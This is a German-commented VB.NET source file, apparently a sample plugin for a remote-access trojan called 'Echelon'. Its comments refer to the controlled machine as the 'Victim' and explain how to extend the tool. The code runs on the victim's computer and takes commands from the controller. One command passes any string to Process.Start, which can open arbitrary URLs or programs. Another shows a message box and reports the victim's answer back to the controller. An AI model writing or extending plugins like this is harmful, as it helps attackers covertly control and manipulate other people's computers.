Imports EchelonServerPlugIn.Class1
Module Module1
    '#####################################################################################################
    '                               -=Echelon Server PlugIn Beispiel=-
    'Mit der Server Klasse können Informationen über den Server ausgelesen, aber nicht verändert werden:
    'z.B. der Installationsort des Servers: Server.ServerInstallPath
    '
    'Mit SendMessageToClientPlugIn können Teste zum Client PlugIn geschickt werden, z.B.:
    'SendMessageToClientPlugIn("Hallo")
    '#####################################################################################################
    'Für die etwas fortgeschrittenen Programmierer:
    'Beim Starten des PlugIns werden Informationen mittels eines StringArrays übergeben. Die Getconnection
    'Methode übergibt einen TcpClient der .Net Sockets, welcher bereits mit dem Victim verbunden ist. Über
    'diesen Socket können Daten (z.B. Textte, Dateien) verschickt werden.
    '#####################################################################################################

    Public Sub PlugInGestartet()
        'PlugIn wurde gestartet, es besteht aber noch keine Verbindung
    End Sub
    Public Sub Verbunden()
        'Verbindung zwischen Client- und Server PlugIn wurde nun hergestellt
    End Sub

    Public Sub NeueNachricht(ByVal sNachricht As String)
        'Alles, was vom Client PlugIn geschickt wird, kommt hier an
        'und wird in der Variable sNachricht gespeichert.

        Dim Befehle() As String = Split(sNachricht, "|")
        If Befehle(0) = "Webseite öffnen" Then
            Try
                Process.Start(Befehle(1))
                SendMessageToClientPlugIn("Webseite geöffnet")
            Catch ex As Exception
                SendMessageToClientPlugIn("Fehler: " & ex.Message)
            End Try
        End If
        If Befehle(0) = "MSG Box" Then
            Dim msgTitel As String = Befehle(1)
            Dim msgText As String = Befehle(2)

            If MsgBox(msgText, MsgBoxStyle.YesNo, msgTitel) = MsgBoxResult.Yes Then
                SendMessageToClientPlugIn("Victim hat JA gedrücke")
            Else
                SendMessageToClientPlugIn("Victim hat NEIN gedrückt")
            End If
        End If

    End Sub
    Public Sub ServerFehler(ByVal sError As String)
        CloseConnection() 'Beende die Verbindung, wenn ein Fehler auftritt.
    End Sub

End Module
